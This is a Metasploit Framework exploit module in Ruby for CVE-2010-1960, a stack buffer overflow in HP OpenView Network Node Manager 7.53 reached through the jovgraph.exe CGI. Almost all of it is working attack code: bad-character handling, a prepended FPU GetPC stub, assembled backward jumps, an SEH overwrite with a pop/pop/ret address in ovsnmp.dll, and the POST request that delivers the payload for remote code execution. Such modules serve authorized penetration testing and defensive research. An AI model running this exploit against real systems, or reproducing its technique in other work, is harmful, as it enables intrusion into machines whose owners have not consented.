##
# $Id: hp_nnm_ovwebsnmpsrv_uro.rb 12095 2011-03-23 15:43:25Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/jovgraph.exe', :pattern => /Hewlett-Packard Development Company/ }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
				prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'
				CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.
				The vulnerable code is within the option parsing function within "ovwebsnmpsrv.exe" with a
				timestamp prior to April 7th, 2010.

				Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined
				with a some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is
				important to note that this vulnerability must be exploited by overwriting SEH. This is since
				overflowing the buffer with controllable data always triggers an access violation when
				attempting to write static text beyond the end of the stack.

				Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish
				arbitrary code execution, a double-backward jump is used in combination with the Alpha2
				encoder.
			} ,
			'Author'         =>
				[
					'jduck'   # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12095 $',
			'References'     =>
				[
					[ 'CVE', '2010-1960' ],
					[ 'OSVDB', '65427' ],
					[ 'BID', '40637' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-105/' ],
					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02217439' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 10240, # 10240 byte buffer..
					# In addition to regular HTTP type bad chars, this one also has
					# an issue with " since the buffer is being passed on the command line.
					'BadChars' => (0x00..0x1f).to_a.pack('C*') + "\x20\x21\x22\x24\x2c\x3b\x3c\x3e\x60",
					'DisableNops' => true,
					# Manually use FPU to get EIP into ECX
					'PrependEncoder' => "\x89\xe2\xdb\xdb\xd9\x72\xf4\x59\x83\xe9\xf7",
					'EncoderOptions' => { 'BufferRegister' => 'ecx' },
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.53 w/NNM_01206',
						{
							'Ret'     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166
						}
					],
					[ 'Debug Target',
						{
							'Ret'     => 0xdeadbeef, # crasher
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'June 08 2010'))

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end

	def exploit

		print_status("Trying target #{target.name}...")

		cgi = '/OvCgi/jovgraph.exe'

		# A long command line option (starts with -) will cause a buffer overflow.

		# Action just has to be set, doesn't matter what it is.
		action = rand_text_alphanumeric(1)

		# "timestamp" cannot be set.

		start = 'Unrecognized option: '

		# SEH
		seh_offset = 0x2cb0  # 0x13ffb0 - 0x13d300
		seh_frame = generate_seh_record(target.ret)

		# Jump back to the payload, after p/p/r jumps to us.
		# NOTE: Putting the jmp_back after the SEH handler seems to avoid problems with badchars..
		# 8 for SEH.Next+SEH.Func, 5 for the jmp_back itself
		distance = seh_offset - 1 + seh_frame.length # dry run
		jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		distance = seh_offset - start.length - 1 - jmp_back.length
		jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

		# A short jump back to the long jump back :)
		jmp_small = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + jmp_back.length.to_s).encode_string
		jmp_small << rand_text(2)

		buf = '-'
		buf << payload.encoded
		buf << "A" * (seh_offset - start.length - buf.length - jmp_back.length)
		buf << jmp_back
		buf << jmp_small
		buf << [target.ret].pack('V')

		# Send the request
		res = send_request_cgi({
			'uri'		  => cgi,
			'method'	  => "POST",
			'vars_post' =>
				{
					'act' => action,
					'arg' => buf,
				}
		}, 3)

		if res and res.code != 502
			print_error("Eek! We weren't expecting a response, but we got one")
			print_status(res.inspect) if datastore['NNM_DEBUG']
		end

		handler

	end

end

